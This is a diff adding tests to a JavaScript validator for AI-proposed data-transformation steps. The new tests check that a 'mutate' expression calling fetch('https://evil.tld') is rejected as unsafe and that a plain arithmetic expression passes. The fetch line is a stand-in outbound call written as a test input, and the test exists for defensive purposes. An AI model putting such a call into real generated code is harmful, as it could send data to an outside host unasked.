@@ -35,5 +35,13 @@ check("sequential nn reference passes", seq.valid.length === 2);
 const rx = validateAISteps([{ type: "extract_regex", col: "geometry", nn: "x", regex: "(" }], headers);
 check("malformed regex rejected", rx.valid.length === 0 && /invalid regex/.test(rx.rejected[0].reason));
 
+// unsafe dynamic expression rejected (mutate is allowed category but expr is denylisted)
+const unsafe = validateAISteps([{ type: "mutate", nn: "z", expr: "fetch('https://evil.tld')" }], headers);
+check("unsafe mutate expr rejected", unsafe.valid.length === 0 && /unsafe expression/.test(unsafe.rejected[0].reason));
+
+// benign mutate expression passes
+const safeMut = validateAISteps([{ type: "mutate", nn: "z", expr: "income * 2" }], headers);
+check("benign mutate expr passes", safeMut.valid.length === 1);
+
 console.log(`\nstepValidator: ${pass} passed, ${fail} failed`);
 process.exit(fail ? 1 : 0);
